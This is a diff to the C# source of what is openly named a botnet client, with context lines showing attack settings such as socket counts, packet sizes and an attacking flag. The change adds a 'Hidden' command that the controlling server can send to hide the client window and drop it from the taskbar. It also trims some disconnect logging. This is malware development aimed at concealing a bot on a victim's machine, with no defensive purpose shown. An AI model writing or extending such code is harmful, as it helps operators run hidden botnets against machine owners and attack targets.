@@ -36,6 +36,7 @@ namespace BotnetClient
         static int SockCount = 8; // How many connections to make?
         static int packetSize = 32; // size of packets being sent during attack
         Boolean attacking = false; // Are we currently attacking?
+        Boolean hidden = false;
         // Other Variables
         static Random Rand = new Random(); // Random number generator
         static string[] UserAgents = // User agent list
@@ -206,6 +207,11 @@ namespace BotnetClient
                                                     Environment.Exit(0);
                                                 }
                                             }
+                                            else if (item.Contains("Hidden"))
+                                            {
+                                                hidden = Boolean.Parse(item.Substring(item.IndexOf(":") + 1));
+                                                toggleHidden();
+                                            }
                                         } catch (Exception error)
                                         {
                                             log("Error parsing update... " + error.ToString());
@@ -220,19 +226,15 @@ namespace BotnetClient
                                 Thread.Sleep(1000);
                             } catch (Exception e){} // no message recieved
                         }
-                        log("Disconnecting...");
                         // Close Socket using the method Close() 
                         try
                         {
                             socket.Shutdown(SocketShutdown.Both);
                             socket.Close();
                         }
-                        catch (Exception e)
-                        {
-                            log("Error closing client socket... (it is probably already closed)");
-                        }
+                        catch (Exception e) { }
                         run = false;
-                        log("Disconnected.");
+                        log("Disconnected from host...");
                     }
                     // Manage of Socket's Exceptions 
                     catch (ArgumentNullException ane)
@@ -465,6 +467,26 @@ namespace BotnetClient
         private void MainPanel_Resize(object sender, EventArgs e)
         {
             logListView.Columns[0].Width = logListView.Width - 20;
+        }
+
+        public void toggleHidden()
+        {
+            if (hidden)
+            {
+                this.Invoke((MethodInvoker)delegate {
+                    // Running on the UI thread
+                    this.Hide();
+                    this.ShowInTaskbar = false;
+                });
+                
+            } else if (!hidden)
+            {
+                this.Invoke((MethodInvoker)delegate {
+                    // Running on the UI thread
+                    this.Show();
+                    this.ShowInTaskbar = true;
+                });
+            }
         }
     }
 }
